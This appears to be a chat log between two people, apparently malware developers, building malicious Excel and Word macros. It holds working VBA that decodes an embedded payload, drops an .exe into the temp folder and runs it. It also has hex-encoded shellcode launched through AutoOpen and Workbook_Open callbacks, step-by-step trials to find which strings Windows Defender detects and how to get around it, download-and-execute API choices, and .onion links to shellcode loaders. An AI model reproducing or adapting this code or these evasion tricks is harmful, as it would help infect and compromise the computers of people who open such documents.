+    If (5 = j) Then j = 0
+    a(i) = b(s + i) Xor key(j)
+    j = j + 1
+Next
+
+Open (f.getspecialfolder(2) + "\\\e.exe") For Binary As #1: Put #1, 1, a: Close #1: Shell (f.getspecialfolder(2) + "\\\e.exe")
+End Sub
+```
+[09.02.22 10:41:43] jaime: That's not very handy, you have to be attached to something
+[09.02.22 10:42:08] ryan: I did it for windward, but it should also work for excel
+[09.02.22 10:43:07] ryan: Googled it in VBA to get, for example, a list of all pictures from the document
+[09.02.22 10:44:27] jaime: Thanks, I'll try to attach it. If everything is dynamic then all the time you have to find the offsets and sizes and pass them to the script
+[09.02.22 10:48:37] ryan: Dim b(1375733) - here is the offset of the required data in the script
+[09.02.22 11:09:32] jaime: I will know the size, but the beginning will have to search. But since the picture will be only one, I think there will be no problems
+[09.02.22 11:10:50] ryan: If there is only one picture, you can search for "JFIF" in the read data, the jpg file signature
+[09.02.22 11:11:55] ryan: Or look for the hta line of the script, its offset in the picture will be known, you can easily get the offset of the beginning of the picture in the file
+[09.02.22 11:13:08] jaime: There's so many possibilities, I can't stop thinking! :)
+[10.02.22 12:22:29] jaime: Hi. I made a picture by adding binary data to it. pict + key + binary. Pasted it into xls. Found it in the file pulled the data, and it's friggin' broken. Apparently excel distorts when pasting
+[10.02.22 12:23:37] ryan: Hi
+[10.02.22 12:24:34] ryan: And hta file is launched from the picture ? Or it does not come to its launch, the file is created bit ?
+[10.02.22 12:27:50] jaime: Bad file
+[10.02.22 12:28:09] jaime: I already thought that something in the script is wrong.
+[10.02.22 12:28:33] jaime: pulled it straight via dd, the same way
+[10.02.22 12:32:42] ryan: You can also do the picture through the insert object, but then the picture will just be displayed as an icon. But excel probably won't do anything with it.
+[10.02.22 12:34:29] jaime: I don't mind, I'm thinking about putting it into base64 cell
+[10.02.22 12:35:11] ryan: If there are no big restrictions on the cell size, it's a good idea
+[10.02.22 12:36:04] jaime: I'll try it as an object first
+[10.02.22 12:45:22] jaime: Oh with object works!
+[10.02.22 13:08:56] ryan: objects should be always kept in unchanged form, as an exact binary copy, without editing
+[10.02.22 13:19:02] jaime: I think it worked fine
+[10.02.22 13:19:10] jaime: I'll run silkcode again
+[10.02.22 13:47:58] jaime: Shel code takes long to start RtlMoveMemory is slow
+[10.02.22 13:49:16] ryan: You can try to replace memcpy from msvcrt.dll, it must be faster
+[10.02.22 13:51:16] jaime: No, I was stupid :) normally shell 250kb
+[14.02.22 09:22:29] jaime: Hi. :)
+[14.02.22 09:35:26] ryan: Hi.
+[14.02.22 09:40:40] jaime: do you know how to mask the launch of an application from vba?
+[14.02.22 09:40:58] jaime: Obfuscation only makes it worse
+[14.02.22 09:42:43] jaime: I tried CreateObject("WScript.Shell").Run cmdLine, 0 and so CallByName CreateObject("WScript.Shell"), "Run", VbMethod, cmdLine and over WMI
+[14.02.22 09:43:37] jaime: even calc won't start with abfuscation, def blocks at once
+[14.02.22 09:43:59] ryan: I was masking shellcode this way:
+```
+Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
+Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+Sub AutoOpen(): Call EnumWindows(h("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub
+```
+There's minimal VBA code, and no foul calls from Wcript.Shell
+[14.02.22 09:44:55] jaime: Does shell already run a dllku?
+[14.02.22 09:45:25] ryan: Yes, it runs either an exe or loads a dll via LoadLibrary
+[14.02.22 09:46:05] ryan: EXE or DLL can be stored in encrypted form at the end of doc file
+[14.02.22 09:46:29] ryan: Or as an object
+[14.02.22 09:46:40] jaime: You don't have shell source? You probably need it in asm. And you need two variants for 32 and 64?
+[14.02.22 09:47:30] ryan: In this example, the shell is 32-bit, it just outputs a message box
+[14.02.22 09:48:02] ryan: I'll find it with exe launch, I did it last year
+[14.02.22 09:49:13] jaime: I can do it in C, but it will be too big :)
+[14.02.22 09:56:27] ryan: ``
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/ldr_shell.asm
+```
+[14.02.22 09:57:00] ryan: There's a shellcode loader and an exe launcher
+[14.02.22 09:58:02] ryan: In compiled form 1500 bytes, so vba script as a result will be about 3.5 Kb in size
+[14.02.22 09:59:16] ryan: The shell there now is 32-bit, but at the very beginning it checks for the current bitness and switches to 32 or 64-bit code. 64 bit shell is not made yet
+[14.02.22 09:59:25] jaime: Can I get more win32a.inc file?
+[14.02.22 09:59:35] ryan: I'll send it right away.
+[14.02.22 09:59:42] jaime: And what asm to build?
+[14.02.22 10:00:03] ryan: Fasm
+[14.02.22 10:00:07] jaime: masm, tasm, nasm ?
+[14.02.22 10:00:16] jaime: oh! :)
+[14.02.22 10:01:47] ryan: ``
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/win32a.inc
+```
+[14.02.22 10:03:59] jaime: Thank you. It's all commented out, by the looks of it.
+[14.02.22 10:08:45] ryan: In win32a.inc ?
+[14.02.22 10:09:33] jaime: And all inc is in fasm itself
+[14.02.22 10:10:05] ryan: In folder Include must be
+[14.02.22 10:29:35] jaime: I built it.  Damn, it's not clear. :)
+[14.02.22 11:10:10] ryan: Forgot to write the batch file for building:
+```
+del poc.bin,32_64.exe&fasm 32_64.asm&haxor/bin 32_64.exe poc.bin /S=START_MARKER /E=END_MARKER
+```
+[14.02.22 11:10:39] ryan: Will extract shellcode from compiled exe and put it into poc.bin file
+[14.02.22 11:15:42] jaime: Is it necessary to run only appropriate shell from the document or you can always 32?
+[14.02.22 11:18:07] jaime: What is haxor utility ?
+[14.02.22 11:18:38] ryan: You can make a common shell there, for 32 bits and for 64.
+At the very beginning of the shellcode there is a check for the current bit rate and a switch to the corresponding shellcode
+It's only 32bit so far, I haven't done 64bit yet.
+[14.02.22 11:18:42] ryan: I'll send it right away.
+[14.02.22 11:20:13] ryan: ``
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/haxor.rar
+```
+Utility to tear out from file a fragment bounded from the beginning and the end by certain marks
+[14.02.22 11:22:17] jaime: everything is ok thanks.
+[14.02.22 11:22:33] jaime: I have to launch dllku, I think I can fix it.
+[14.02.22 11:23:00] jaime: But I don't think so with 64 and 32 bit branches :)
+[14.02.22 11:30:21] jaime: this code has a detection
+[14.02.22 11:31:36] ryan: Does Defender catch ?
+[14.02.22 11:31:48] jaime: yeah
+[14.02.22 11:31:54] jaime: even though it doesn't work
+[14.02.22 11:32:04] jaime: I put it into 64 bit just to check
+[14.02.22 11:32:05] ryan: Does it detect this ?
+```
+Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
+Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+Sub AutoOpen(): Call EnumWindows(h(""), 0): End Sub
+```
+[14.02.22 11:37:16] jaime: Will extract shellcode from compiled exe and put it into poc.bin file
+11:15
+Do you only need to run the appropriate shellcode from the document, or can you always run 32?
+And what is the haxor utility ?
+11:18
+You can make a common shell there, for 32 bit and for 64 bit.
+At the very beginning of the shellcode there is a check for the current bit rate and a jump to the corresponding shellcode
+[14.02.22 11:37:39] jaime: Yeah, there is also a detection
+[14.02.22 11:40:40] ryan: Is this one line detected ?
+```
+Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+```
+[14.02.22 11:42:11] jaime: I'll study it now :)
+[14.02.22 12:58:12] jaime: ``
+Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+
+Sub Workbook_Open()
+End Sub
+
+```
+[14.02.22 12:58:22] jaime: That's how the detector works
+[14.02.22 12:59:18] ryan: You can try to change variable and function names, most likely they stray
+[14.02.22 13:00:01] jaime: ``
+
+Function decode(e): For s = 1 To Len(e) Step 2: Next: End Function
+Sub Workbook_Open()
+
+End Sub
+
+```
+[14.02.22 13:00:08] jaime: Not anymore
+[14.02.22 13:01:10] ryan: In this fragment the signature means:
+```
+h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2))))
+```
+[14.02.22 13:03:27] ryan: That's how it sticks ?
+```
+Function QQQ(AAA): For BBB = 1 To Len(AAA) Step 2: QQQQ = QQQ & Chr("&h" & Mid(AAA, BBB, 2)) Next: End Function
+```
+[14.02.22 13:06:14] jaime: ``.
+Function decode(e): For s = 1 To Len(e) Step 2: decode = decode & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+Sub Workbook_Open(): End Sub
+```
+[14.02.22 13:06:20]
+[14.02.22 13:06:37] jaime: Private Declare Function EnumWindows Lib "user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long
+[14.02.22 13:06:44] jaime: That's the same detection
+[14.02.22 13:12:12] ryan: ``
+n = "P" + "r" + "ivate Declare Function EnumWindows Lib ""user32.dll" (ByVal p2 As String, ByVal p4 As Long) As Long"
+Execute n
+```
+[14.02.22 13:12:28] ryan: This way you can mask the whole string (or the whole script)
+[14.02.22 13:17:08] jaime: Is it something like Eval ?
+[14.02.22 13:17:17] jaime: It frowns
+[14.02.22 13:17:23] ryan: Yes, like Eval in javascript
+[14.02.22 13:17:49] jaime: xls eval works weird
+[14.02.22 13:20:34] ryan: You can also mangle letters, like this:
+```
+a = chr(asc("P") xor 55 xor 55) + chr(asc("r") xor 55 xor 55) ... etc.
+```
+[14.02.22 13:30:47] jaime: Yes I understand the point, I used a similar theme in javascript
+[14.02.22 13:59:49] jaime: I can't get it, no way :)
+[14.02.22 14:10:47] ryan: Does Defender detect or does the script not start ?
+[14.02.22 14:15:12] jaime: Script does not start
+[14.02.22 14:16:19] ryan: Any vba errors ?
+[14.02.22 14:18:30] jaime: Sub or function not defined
+[14.02.22 14:18:41] jaime: On Execute
+[14.02.22 14:29:33] ryan: Now I'll try to use Application.Run again
+[14.02.22 14:31:20] jaime: Sorry to interrupt. :(
+[14.02.22 15:11:33] ryan: Evaluate takes only text from cells, not from string
+But Evaluate should be like that in javascript, I'll look for more
+[14.02.22 15:20:40] ryan: And that's how it sticks?
+```
+Private Declare Function EnumWindows Lib "user32.dll" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBB As Long) As Long
+```
+[14.02.22 15:28:25] jaime: Now
+[14.02.22 15:29:59] jaime: TrojanDownloader:Win32/Powdow!ml
+[14.02.22 15:30:03] jaime: Yeah
+[14.02.22 15:30:22] jaime: ``
+Private Declare PtrSafe Function EnumWindows Lib "user32.dll" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBB As Long) As Long
+Sub Workbook_Open()
+End Sub
+
+```
+[14.02.22 15:30:50] ryan: And so ?
+```
+Private Declare Function EnumWindows Lib "" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBB As Long) As Long
+```
+[14.02.22 15:31:43] ryan: And also like this:
+```
+Private Declare Function MessageBoxA Lib "" (ByVal AAAAAAAAAA As String, ByVal BBBBBBBB As Long) As Long
+```
+[14.02.22 15:35:35] ryan: If the string EnumWindows reacts to, I'll try to find another one from user32.dll
+[14.02.22 15:40:39] ryan: Try this, with another API:
+```
+Private Declare Function EnumDisplayMonitors Lib "user32.dll" (ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As String, ByVal p4 As Long) As Long
+Function h(e): For s = 1 To Len(e) Step 2: h = h & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+Sub AutoOpen(): Call EnumDisplayMonitors(0,0,h("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub
+```
+[14.02.22 15:45:00] ryan: I'll be gone an hour
+[14.02.22 16:10:37] jaime: Damn similar to TrojanDownloader:Win32/Powdow!ml
+[14.02.22 16:16:56] jaime: ``
+Private Declare PtrSafe Function EnumDisplayMonitors Lib "user32.dll" (ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As String, ByVal p4 As Long) As Long
+
+
+
+Function decode(e): For s = 1 To Len(e) Step 2: decode = decode & Chr(Asc(Chr("&h" & Mid(e, s, 2)))): Next: End Function
+
+Sub Workbook_Open(): Call EnumDisplayMonitors(0, 0, decode("E8000000005D64A1300000008B400C8B40148B008B008B4010898560010000E8BA00000089855C010000E80D0000004C6F61644C6962726172794100FFB560010000FF955C010000898568010000E80B0000007573657233322E646C6C00FF9568010000898564010000E80C0000004D657373616765426F784100FFB564010000FF955C01000089856C0100006A00E80F00000054657374207368656C6C636F646500E80D00000054657374206D657373616765006A00FF956C010000E80C0000004578697450726F6365737300FFB560010000FF955C0100006A00FFD091535685C974778B413C8D4408788B108D04118B501885D274648B58208D1C198B338D3431813E47657450754B817E04726F63417542817E08646472657539817E0B657373007530F7DA8B70188D14168B70248D34310FB714568B701C8D34318B34968B1039D672158B580401D339DE730C8D04315E5BC383C3044A75A231C05E5BC30000000000000000000000000000000000000000"), 0): End Sub
+
+```
+[14.02.22 16:17:05] jaime: This one's clean! :)
+[14.02.22 17:32:38] ryan: So there was a detection on EnumWindows API
+[02/15/222 08:02:01] jaime: Hi.
+[15.02.22 08:02:25] jaime: And you run your shell from vba?
+[15.02.22 08:02:44] jaime: My Excel crashes.
+[15.02.22 08:03:14] jaime: I did it with this doc:
+[15.02.22 08:03:18] jaime: ``
+https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c
+```
+[15.02.22 08:04:27] jaime: Shell itself works, but launch from vba does not. Yours is the same for some reason. :(
+[15.02.22 08:05:26] ryan: Hi.
+[15.02.22 08:05:48] ryan: Does it run on 32bit or 64bit?
+[15.02.22 08:06:02] jaime: on 64
+[15.02.22 08:06:16] jaime: Office is 64 too
+[02/15/222 08:07:21] ryan: It ran fine from the test application because it was 32 bit. Excel is 64 bit so it crashes, there is no 64 bit shellcode there yet.
+[15.02.22 08:08:23] ryan: If you need 64-bit shell, I can finish writing it for you.
+[15.02.22 08:09:01] jaime: Write more plz.
+[15.02.22 08:09:22] jaime: You don't even need to download it, just load dll and run function
+[15.02.22 08:10:12] jaime: I made my shell, it give me msgbox and in loop goes to sleep
+[15.02.22 08:10:20] jaime: Running it like shel works
+[15.02.22 08:10:25] jaime: I put into the dock no
+[15.02.22 08:10:52] ryan: Ok, I'll make 64 bit one then
+[15.02.22 08:11:27] jaime: Thank you very much.
+[15.02.22 08:41:44] jaime: Do you need bin to vba utility?
+[15.02.22 08:43:09] ryan: Yes, send it to me.
+[15.02.22 08:52:13] jaime: ``
+https://dropfiles.me/download/23264d0cceb5f99c/#7fHSDBVlv_G7jLrz808jrA
+```
+[15.02.22 08:52:23] jaime: 109dbb161bfe9d97f22c8a62f53e0035
+[15.02.22 08:53:19] jaime: There is actually a source in python, built exe. And there is a utility to run the shell
+[15.02.22 08:57:31] ryan: Downloaded
+[02/15/222 10:50:55] jaime: Def is hell, yesterday there were no detects, today there are already
+[15.02.22 10:53:01] ryan: If internet was on, it sends suspicious files to cloud
+[02/15/222 10:54:06] jaime: cloud is off
+[15.02.22 10:54:24] jaime: I was told to check as users
+[02/15/222 10:59:16] jaime: Otherwise it turns out I have no detects at testers have. :( vicious circle
+[02/15/222 11:01:46] ryan: I redid it completely in Winapi:
+```
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/test.vba
+```
+[15.02.22 11:02:33] ryan: Dumps file into %temp% folder and runs it
+[15.02.22 11:03:16] ryan: Now I will re-download it, the new one is downloading
+[02/15/222 11:06:21] ryan: ``
+http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/test2.vba
+```
+[15.02.22 11:30:59] ryan: Downloaded ?
+[16.02.22 14:25:19] jaime: Hi. :)
+[16.02.22 14:25:36] jaime: You remember wrote ways to download the file
+[16.02.22 14:26:09] jaime: All APIs are crashing
+[16.02.22 14:26:15] jaime: ``
+Private Declare PtrSafe Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
+Private Declare PtrSafe Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
+Private Declare PtrSafe Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
+Private Declare PtrSafe Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
+Private Declare PtrSafe Function lcreat Lib "kernel32" Alias "_lcreat" (ByVal p1 As String, ByVal p2 As Long) As Long
+Private Declare PtrSafe Function lwrite Lib "kernel32" Alias "_lwrite" (ByVal p1 As Long, ByVal p2 As String, ByVal p3 As Long) As Long
+Private Declare PtrSafe Function lclose Lib "kernel32" Alias "_lclose" (ByVal p1 As Long) As Long
+
+```
+[16.02.22 14:26:30] jaime: Put any of them in and all detected
+[16.02.22 14:26:55] jaime: But WinExec does not detect
+[16.02.22 14:27:08] ryan: Hi.
+[16.02.22 14:27:27] ryan: Is there a detection on _lcreat/_lwrite ?
+[16.02.22 14:27:33] jaime: yes
+[16.02.22 14:27:54] ryan: UrlDownloadToFile(A|W) you can also try
+[16.02.22 14:28:36] ryan: InterneetOpenA and InternetOpenUrlA you can also try to replace with InternetOpenW and InternetOpenUrlW
+[16.02.22 14:29:08] jaime: And then how to save it to disk?
+[16.02.22 14:29:34] jaime: you remember once wrote that you can download a word file, will it work?
+[16.02.22 14:29:34] ryan: UrlDownloadToFile writes directly to the file specified in its parameters
+[16.02.22 14:29:47] jaime: Let me see! :)
+[16.02.22 14:30:11] ryan: With command winword <url> or winword <excel> you can
+[16.02.22 14:30:39] ryan: But you have to look for file in folder %temp% somehow
+[16.02.22 14:31:14] jaime: URLDownloadToFile by the way has no detection
